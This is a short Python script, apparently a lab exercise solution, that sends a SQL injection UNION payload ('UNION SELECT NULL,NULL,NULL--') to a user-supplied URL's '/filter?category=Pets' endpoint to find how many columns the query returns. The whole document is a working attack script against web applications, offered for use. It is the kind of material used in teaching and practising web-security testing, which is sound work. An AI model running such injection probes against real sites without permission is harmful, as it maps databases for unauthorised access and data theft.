#SQL injection UNION attack, determining the number of columns returned by the query
import requests
path="/filter?category=Pets"
url = input("enter url : ")
payload="'+UNION+SELECT+NULL,NULL,NULL--"


r=requests.get(url+path+payload)
